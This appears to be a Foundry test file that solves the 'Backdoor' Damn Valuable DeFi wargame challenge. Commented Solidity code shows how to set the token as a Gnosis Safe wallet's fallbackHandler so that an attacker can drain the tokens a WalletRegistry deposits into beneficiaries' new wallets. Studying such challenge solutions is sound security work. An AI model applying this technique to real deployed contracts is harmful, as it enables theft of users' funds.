// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "../src/WalletRegistry.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/Safe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/SafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/SafeProxyFactory.sol";
import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

contract DamnValuableToken is ERC20 {
    constructor() ERC20("DamnValuableToken", "DVT") {
        _mint(msg.sender, type(uint256).max);
    }
}

contract BackdoorTest is Test {

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40 ether;
    uint256 constant AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET = 10 ether;

    address payable attacker;
    address payable user1;
    address payable user2;
    address payable user3;
    address payable user4;
    address[] beneficiaries;
    
    Safe masterCopy;
    SafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;


    constructor() {
    }

    function setUp() public {
        user1 = payable(address(10));
        vm.label(user1, "user1");
        beneficiaries.push(user1);
        vm.deal(user1, 100 ether);

        user2 = payable(address(20));
        vm.label(user2, "user2");
        beneficiaries.push(user2);
        vm.deal(user2, 100 ether);

        user3 = payable(address(30));
        vm.label(user3, "user3");
        beneficiaries.push(user3);
        vm.deal(user3, 100 ether);

        user4 = payable(address(40));
        vm.label(user4, "user4");
        beneficiaries.push(user4);
        vm.deal(user4, 100 ether);

        attacker =payable(address(50));
        vm.deal(attacker, 100 ether);

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new Safe();
        walletFactory = new SafeProxyFactory();
        token = new DamnValuableToken();


        vm.label(address(masterCopy), "GnosisSafe");
        vm.label(address(walletFactory), "GnosisSafeProxyFactory");
        vm.label(address(token), "DamnValuableToken");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(token),
            beneficiaries
        );
        vm.label(address(walletRegistry), "WalletRegistry");

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            assertTrue(
                walletRegistry.beneficiaries(beneficiaries[i])
            );
        }

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
    }

    function test_exploit() public {
        // To create a new proxy wallet we will use:
        // `GnosisSafeProxyFactory.createProxyWithCallback` 
        // 1) use the callback as an additional parameter to generate the salt nonce
        // In this case we need to use the first function because otherwise the `WalletRegistry.proxyCreated` callback would be never called 

        // As you can see there are many checks inside this function and it seems pretty safe.
        // Only a wallet with one whitelisted (by the registry) benificiary can receive (only once) 10 DVT token after the callback has been created
        
        // Without the threshold/ownership checks we could have created a wallet with threshold equal to one and with two owners (beneficiary + attacker)
        // and after the transfer we would have executed a transcaction on the wallet to transfer the tokens to the attacker. But this is not a viable option.
        
        // Our goal is to find a way to create a wallet, with the correct owner (registry beneficiary), correct configuration
        // but with a "backdoor" to be able to transfer the DVT that the registry transfer to the wallet after the creation
        
        // By looking at the `GnosisSafe.setup` function that we call to create the proxy wallet we see that 
        // there's a `fallbackHandler` parameter... if you look inside the `internalSetFallbackHandler` you will see that
        // if that parameter is setup correctly we are able to replace the wallet `fallback` function with an arbitrary
        // low-level call that will "forward" all the payload to `fallbackHandler` executing it directly from the wallet contract...
        // If we setup the `token` as the `fallbackHandler` we will be able 
        // to execute calls to the token contract directly from the wallet WITHOUT being the owners of the wallet!

        for( uint i = 0; i < beneficiaries.length; i++ ) {
            // setup wallet beneficiary
            address[] memory walletOwners = new address[](1);
            walletOwners[0] = beneficiaries[i];

            // setup the initializer of the wallet by setting the token as the wallet's `fallbackHandler`
            // this will allow us to execute calls to the token contract from the wallet without being the owner
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
                walletOwners,   // _owners
                1,              // _threshold
                address(0),     // to
                "",             // data
                address(token), // fallbackHandler
                address(0),     // paymentToken
                0,              // payment
                address(0)      // paymentReceiver
            );

            // generate the wallet and call the registry callback
            SafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);


            // use the fallback we setup earlier to directly transfer DVT tokens from the wallet to the attacker!
            vm.prank(attacker);
            (bool approveSuccess, ) = address(proxy).call(
                abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET)
            );
            assertEq(approveSuccess, true);
        }

        // assertion
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            address wallet = walletRegistry.wallets(beneficiaries[i]);
            assertTrue(wallet != address(0));

            // User is no longer registered as a beneficiary
            bool userIsStillBeneficiary = walletRegistry.beneficiaries(beneficiaries[i]);
            assertEq(userIsStillBeneficiary, false);
        }

        // Attacker must have taken all tokens
        assertEq(token.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED );
    }
}